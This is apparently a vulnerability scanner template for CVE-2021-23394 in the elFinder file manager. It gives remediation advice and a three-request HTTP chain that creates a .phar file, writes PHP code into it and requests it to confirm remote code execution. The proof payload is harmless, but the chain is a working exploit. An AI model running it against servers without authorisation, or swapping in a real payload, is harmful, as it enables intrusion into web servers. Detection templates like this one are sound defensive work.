id: CVE-2021-23394

info:
  name: elFinder < 2.1.58 - Remote Code Execution via .phar Upload
  author: Drshnnn
  severity: critical
  description: |
    elFinder before 2.1.58 allows remote code execution via the creation and execution of a .phar file. The .phar extension was not included in the blocklist of dangerous file types, allowing attackers to create files with PHP code using the mkfile/put commands. On servers where .phar files are parsed as PHP (default Apache configuration), this leads to arbitrary code execution.
  impact: |
    Successful exploitation allows unauthenticated remote attackers to execute arbitrary PHP code on the server, potentially leading to full system compromise.
  remediation: |
    Upgrade elFinder to version 2.1.58 or later where .phar files are blocked. As a workaround, configure the server to not execute .phar files as PHP, or implement access controls on the connector endpoint.
  reference:
    - https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities/
    - https://github.com/Studio-42/elFinder/issues/3295
    - https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1
    - https://nvd.nist.gov/vuln/detail/CVE-2021-23394
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-23394
    cwe-id: CWE-434
    cpe: cpe:2.3:a:std42:elfinder:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: std42
    product: elfinder
    shodan-query: http.title:"elFinder"
    fofa-query: title="elFinder"
  tags: cve,cve2021,elfinder,rce,fileupload,phar,intrusive,kev,std42,vuln

variables:
  string: "CVE-2021-23394"
  filename: "{{rand_text_alpha(8)}}"

flow: http(1) && http(2) && http(3)

http:
  - raw:
      - |
        GET /elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name={{filename}}.phar HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "added")'
          - 'contains(body, "hash")'
        condition: and
        internal: true

    extractors:
      - type: json
        name: file_hash
        part: body
        json:
          - '.added[0].hash'
        internal: true

  - raw:
      - |
        GET /elFinder/php/connector.minimal.php?cmd=put&target={{file_hash}}&content=%3C%3Fphp%20echo%20md5%28%27{{string}}%27%29%3Bunlink%28__FILE__%29%3B%3F%3E HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "changed")'
        condition: and
        internal: true

  - raw:
      - |
        GET /elFinder/files/{{filename}}.phar HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{{md5(string)}}'

      - type: status
        status:
          - 200

